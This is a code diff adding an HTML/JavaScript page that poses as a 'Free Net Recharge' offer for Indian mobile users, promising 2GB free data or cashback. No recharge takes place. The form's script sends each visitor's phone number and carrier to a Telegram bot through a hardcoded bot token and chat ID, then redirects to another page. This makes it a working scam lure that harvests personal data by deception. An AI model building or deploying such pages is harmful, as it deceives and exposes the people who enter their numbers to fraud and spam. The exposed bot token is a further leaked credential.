@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Net Recharge · India</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #0b1017;
+            background: radial-gradient(circle at 30% 20%, #1d3d4a, #0a121c);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .recharge-card {
+            width: 100%;
+            max-width: 440px;
+            background: rgba(12, 26, 36, 0.95);
+            backdrop-filter: blur(12px);
+            border: 1.5px solid #ffaa3350;
+            border-radius: 48px;
+            padding: 2.2rem 1.8rem 2.5rem;
+            box-shadow: 0 40px 60px -15px #000000e0, 0 0 0 2px #ff993322 inset;
+        }
+
+        .tricolor-strip {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+        }
+        .tricolor-strip div {
+            width: 35px;
+            height: 6px;
+            border-radius: 20px;
+        }
+        .saffron { background: #ff9933; }
+        .white { background: #ffffff; }
+        .green { background: #138808; }
+
+        .provider {
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+        .provider .free {
+            font-size: 2.4rem;
+            font-weight: 700;
+            background: linear-gradient(145deg, #ffb347, #ff8800);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px #ff9900;
+        }
+        .provider .net {
+            font-size: 2.4rem;
+            font-weight: 300;
+            color: #d6edff;
+            margin-left: 6px;
+        }
+        .badge {
+            background: #1b3f48;
+            color: #b0f2f2;
+            padding: 0.4rem 1.8rem;
+            border-radius: 60px;
+            display: inline-block;
+            font-size: 1rem;
+            border: 1px solid #ff9933;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+
+        /* dynamic offer message based on visit */
+        .offer-banner {
+            background: #0f2e38;
+            border-radius: 60px;
+            padding: 1.2rem 1rem;
+            margin: 1.8rem 0 2.2rem;
+            text-align: center;
+            border-left: 6px solid #ff9933;
+            border-right: 6px solid #138808;
+        }
+        .first-offer {
+            color: #b0ffd0;
+            font-size: 2rem;
+            font-weight: 600;
+            text-shadow: 0 0 15px #00ffaa;
+            line-height: 1.3;
+        }
+        .return-offer {
+            color: #ffe484;
+            font-size: 2rem;
+            font-weight: 600;
+            text-shadow: 0 0 15px #ffbf00;
+            line-height: 1.3;
+        }
+        .offer-small {
+            display: block;
+            font-size: 1rem;
+            color: #bbddee;
+            margin-top: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group {
+            margin-bottom: 1.4rem;
+        }
+        .input-label {
+            display: block;
+            color: #c9e3f0;
+            margin-left: 1rem;
+            margin-bottom: 0.4rem;
+            font-size: 0.95rem;
+            font-weight: 400;
+        }
+        .input-field {
+            width: 100%;
+            background: #132a35;
+            border: 2px solid #2d5668;
+            border-radius: 60px;
+            padding: 1.2rem 1.8rem;
+            font-size: 1.1rem;
+            color: #f0fcff;
+            outline: none;
+            transition: 0.2s;
+            box-shadow: inset 0 5px 10px #00000070;
+        }
+        .input-field:focus {
+            border-color: #ff9933;
+            box-shadow: 0 0 20px #ffaa3370, inset 0 3px 8px black;
+        }
+        .input-field::placeholder {
+            color: #6097aa;
+            font-weight: 300;
+        }
+
+        /* ISP selector styling */
+        .isp-selector {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            justify-content: center;
+            margin: 1.8rem 0 2rem;
+        }
+        .isp-option {
+            flex: 1 0 auto;
+            min-width: 70px;
+        }
+        .isp-option input[type="radio"] {
+            display: none;
+        }
+        .isp-option label {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #1d3844;
+            color: #c9e3f0;
+            padding: 0.9rem 1.2rem;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border: 2px solid #2e5a6b;
+            cursor: pointer;
+            transition: all 0.15s;
+            box-shadow: 0 4px 0 #0e2a32;
+            letter-spacing: 0.5px;
+        }
+        .isp-option input[type="radio"]:checked + label {
+            background: linear-gradient(145deg, #ff9933, #e57e1f);
+            color: #0a1a22;
+            border-color: #ffcc99;
+            box-shadow: 0 6px 0 #b35f00, 0 0 20px #ffaa33;
+            transform: translateY(-2px);
+        }
+        .isp-option label:active {
+            transform: translateY(3px);
+            box-shadow: 0 2px 0 #0e2a32;
+        }
+
+        .recharge-btn {
+            width: 100%;
+            background: linear-gradient(145deg, #ff9933, #e57e1f);
+            border: none;
+            border-radius: 60px;
+            padding: 1.3rem;
+            font-size: 1.9rem;
+            font-weight: 700;
+            color: #0e2028;
+            text-transform: uppercase;
+            letter-spacing: 2.5px;
+            cursor: pointer;
+            box-shadow: 0 10px 0 #b35f00, 0 20px 35px #ff8800b0;
+            border: 1px solid #ffcc99;
+            transition: 0.08s linear;
+            margin: 1.5rem 0 0.5rem;
+        }
+        .recharge-btn:active {
+            transform: translateY(8px);
+            box-shadow: 0 4px 0 #b35f00, 0 20px 35px #ffaa33;
+        }
+        .recharge-btn:disabled {
+            opacity: 0.7;
+            transform: translateY(5px);
+            box-shadow: 0 5px 0 #b35f00;
+        }
+
+        .status-message {
+            text-align: center;
+            margin-top: 1.2rem;
+            padding: 0.9rem;
+            border-radius: 60px;
+            font-weight: 500;
+            display: none;
+        }
+        .status-message.show {
+            display: block;
+        }
+        .status-success {
+            background: #13880830;
+            color: #bcffbc;
+            border: 1px solid #138808;
+        }
+        .status-error {
+            background: #ff333330;
+            color: #ffb3b3;
+            border: 1px solid #ff5555;
+        }
+        .status-sending {
+            background: #ff993330;
+            color: #ffd8a8;
+            border: 1px solid #ff9933;
+        }
+
+        .footer-note {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin-top: 2.2rem;
+            color: #4e7f90;
+            font-size: 0.85rem;
+        }
+        .footer-note span {
+            background: #19323e;
+            padding: 0.4rem 1.5rem;
+            border-radius: 60px;
+            border: 1px solid #ff993355;
+        }
+    </style>
+</head>
+<body>
+    <div class="recharge-card">
+        <div class="tricolor-strip">
+            <div class="saffron"></div><div class="white"></div><div class="green"></div>
+        </div>
+
+        <div class="provider">
+            <span class="free">free</span><span class="net">net</span>
+            <div class="badge">🇮🇳 recharge · 2GB free</div>
+        </div>
+
+        <!-- dynamic offer based on localStorage (first/return) -->
+        <div id="offerBanner" class="offer-banner">
+            <!-- filled by js -->
+        </div>
+
+        <!-- recharge form: number + ISP, then send to Telegram -->
+        <form id="rechargeForm">
+            <div class="input-group">
+                <div class="input-label">📱 mobile number</div>
+                <input type="tel" id="mobile" class="input-field" placeholder="10-digit mobile number" pattern="[0-9]{10}" maxlength="10" inputmode="numeric" required>
+            </div>
+
+            <!-- ISP selection: JIO, airtel, BSNL, VI -->
+            <div class="input-label" style="margin-bottom: 0.2rem;">📡 select your ISP</div>
+            <div class="isp-selector">
+                <div class="isp-option">
+                    <input type="radio" name="isp" id="jio" value="JIO" required>
+                    <label for="jio">JIO</label>
+                </div>
+                <div class="isp-option">
+                    <input type="radio" name="isp" id="airtel" value="AIRTEL">
+                    <label for="airtel">airtel</label>
+                </div>
+                <div class="isp-option">
+                    <input type="radio" name="isp" id="bsnl" value="BSNL">
+                    <label for="bsnl">BSNL</label>
+                </div>
+                <div class="isp-option">
+                    <input type="radio" name="isp" id="vi" value="VI">
+                    <label for="vi">VI</label>
+                </div>
+            </div>
+
+            <button type="submit" class="recharge-btn" id="submitBtn">RECHARGE</button>
+        </form>
+
+        <div id="statusMsg" class="status-message"></div>
+
+        <div class="footer-note">
+            <span>🎁 2GB new user</span>
+            <span>💰 cashback return</span>
+        </div>
+    </div>
+
+    <script>
+        // ----- TELEGRAM BOT CONFIG (your credentials) -----
+        const BOT_TOKEN = "8201435516:AAFvVxy3a0-M0BpHwsTo7C-gnCVHh4YJsZw";
+        const CHAT_ID = "6190190972";   // your actual chat ID
+
+        // ----- localStorage key for tracking first/return -----
+        const USER_KEY = 'freeNetUser';
+
+        // ----- Set offer message based on visit count -----
+        (function setOfferMessage() {
+            const offerDiv = document.getElementById('offerBanner');
+            const isReturning = localStorage.getItem(USER_KEY);
+
+            if (!isReturning) {
+                // first time: mark as visited, show 2GB free
+                localStorage.setItem(USER_KEY, 'visited');
+                offerDiv.innerHTML = '<div class="first-offer">📶 2GB FREE</div><div class="offer-small">for new users · first recharge only</div>';
+            } else {
+                // returning: show amazing cashback
+                offerDiv.innerHTML = '<div class="return-offer">💰 AMAZING CASHBACK</div><div class="offer-small">on every recharge · limited period</div>';
+            }
+        })();
+
+        // ----- Function to send data to Telegram (blocks until done) -----
+        async function sendToTelegram(mobile, isp, userType) {
+            const message = `🔓 *FREE NET RECHARGE*  
+🇮🇳 *India*  
+📱 Mobile: \`${mobile}\`  
+📡 ISP: *${isp}*  
+👤 User: ${userType}  
+🎁 Offer: ${userType === 'First time' ? '2GB free' : 'cashback'}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+
+            // Use sendBeacon if available (best for page unload), but we also await a fetch for reliability
+            // We'll do both: sendBeacon for sure, and also wait for fetch to complete before redirect.
+            
+            // 1. Fire-and-forget with sendBeacon (guaranteed to attempt even if page unloads)
+            if (navigator.sendBeacon) {
+                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                navigator.sendBeacon(url, blob);
+            }
+            
+            // 2. Also use fetch with await to ensure we wait for completion before redirect
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Telegram fetch error:', error);
+                return false;
+            }
+        }
+
+        // ----- MAIN FORM HANDLER -----
+        document.getElementById('rechargeForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const mobile = document.getElementById('mobile').value.trim();
+            const ispRadio = document.querySelector('input[name="isp"]:checked');
+            const submitBtn = document.getElementById('submitBtn');
+            const statusDiv = document.getElementById('statusMsg');
+
+            // Validation
+            if (!mobile || !/^[6-9]\d{9}$/.test(mobile)) {
+                statusDiv.className = 'status-message status-error show';
+                statusDiv.textContent = '❌ Enter a valid 10-digit Indian mobile number';
+                return;
+            }
+
+            if (!ispRadio) {
+                statusDiv.className = 'status-message status-error show';
+                statusDiv.textContent = '❌ Please select your ISP';
+                return;
+            }
+
+            const isp = ispRadio.value;
+
+            // Disable button, show sending status
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'PROCESSING...';
+            statusDiv.className = 'status-message status-sending show';
+            statusDiv.textContent = '⏳ Sending recharge details...';
+
+            // Determine user type
+            const userType = localStorage.getItem(USER_KEY) === 'visited' ? 'First time' : 'Returning';
+
+            // Send to Telegram and wait for completion
+            const sent = await sendToTelegram(mobile, isp, userType);
+
+            if (sent) {
+                statusDiv.className = 'status-message status-success show';
+                statusDiv.textContent = '✓ Recharge initiated! Redirecting...';
+            } else {
+                statusDiv.className = 'status-message status-error show';
+                statusDiv.textContent = '⚠️ Server update, redirecting anyway...';
+            }
+
+            // Redirect to 2.html (or any final page) after short delay
+            setTimeout(() => {
+                window.location.href = '2.html';  // you can change this to another page if needed
+            }, 1500);
+        });
+
+        // Mobile number validation: only digits, max 10
+        document.getElementById('mobile').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+        });
+    </script>
+</body>
+</html>
